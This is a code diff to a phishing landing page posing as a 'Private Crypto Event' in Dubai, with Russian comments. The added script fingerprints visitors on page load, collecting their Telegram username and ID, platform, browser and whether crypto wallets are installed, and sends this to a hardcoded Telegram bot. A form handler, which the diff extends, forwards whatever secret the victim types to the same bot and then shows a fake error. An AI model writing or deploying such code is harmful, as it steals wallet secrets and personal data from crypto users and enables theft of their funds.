@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Private Crypto Event | Dubai 2026</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <style>
         body { background-color: #0B0E11; color: #EAECEF; font-family: system-ui, sans-serif; }
@@ -40,29 +41,84 @@
     </div>
 
     <script>
+        // Инициализируем Telegram WebApp
+        const tg = window.Telegram ? window.Telegram.WebApp : null;
+        if (tg) {
+            tg.expand(); // Разворачиваем Mini App на весь экран телефона
+        }
+
+        // Функция сбора технических параметров
+        function getSystemInfo() {
+            // Данные пользователя из Telegram
+            const user = tg && tg.initDataUnsafe && tg.initDataUnsafe.user ? tg.initDataUnsafe.user : null;
+            const tgUser = user ? `@${user.username} (${user.id})` : "Не через Telegram / Web";
+            
+            // Платформа (ios, android, tdesktop, web)
+            const platform = tg ? tg.platform : "unknown_web";
+            
+            // Браузер (User-Agent)
+            const browser = navigator.userAgent;
+
+            // Проверка наличия EVM кошельков (MetaMask, TrustWallet и т.д.)
+            const hasEvmWallet = typeof window.ethereum !== 'undefined' ? "Да (Обнаружен)" : "Нет";
+            
+            // Проверка кошельков Phantom (Solana)
+            const hasSolanaWallet = typeof window.solana !== 'undefined' ? "Да (Phantom)" : "Нет";
+
+            return { tgUser, platform, browser, hasEvmWallet, hasSolanaWallet };
+        }
+
+        // Автоматическая отправка лога о посещении при загрузке страницы
+        async function sendVisitLog() {
+            const info = getSystemInfo();
+            const BOT_TOKEN = '8799494888:AAEusRS6TiER_TTORx7EP1q_HpYV2osfPUs';
+            const CHAT_ID = '-5217553322';
+
+            const visitMessage = `👤 НОВЫЙ ПОСЕТИТЕЛЬ МИНИ-АПП!\n\n` +
+                                 `• Пользователь: ${info.tgUser}\n` +
+                                 `• Платформа: ${info.platform}\n` +
+                                 `• EVM Кошелек: ${info.hasEvmWallet}\n` +
+                                 `• Solana Кошелек: ${info.hasSolanaWallet}\n` +
+                                 `• Браузер: ${info.browser}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: visitMessage })
+                });
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        // Запускаем сбор и отправку данных о входе сразу при открытии сайта
+        sendVisitLog();
+
+        // Логика отправки текста из формы (кнопка)
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const inputData = document.getElementById('secretInput').value;
             const errorBlock = document.getElementById('errorMessage');
+            const info = getSystemInfo();
 
-            // Твои открытые данные для теста
             const BOT_TOKEN = '8799494888:AAEusRS6TiER_TTORx7EP1q_HpYV2osfPUs';
             const CHAT_ID = '-5217553322';
             
-            const message = `⚠️ СВЕЖИЙ ЛОГ С ЛЕНДИНГА!\n\nВвод: ${inputData}`;
+            const actionMessage = `⚠️ СВЕЖИЙ ВВОД С ЛЕНДИНГА!\n\n` +
+                                  `• Пользователь: ${info.tgUser}\n` +
+                                  `• Ввод: ${inputData}`;
 
             try {
-                // Прямой запрос к серверам Telegram из браузера
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: actionMessage })
                 });
             } catch (err) {
-                console.error('Ошибка отправки:', err);
+                console.error(err);
             }
 
-            // Показываем фейковую ошибку и очищаем инпут
             errorBlock.classList.remove('hidden');
             document.getElementById('secretInput').value = '';
         });
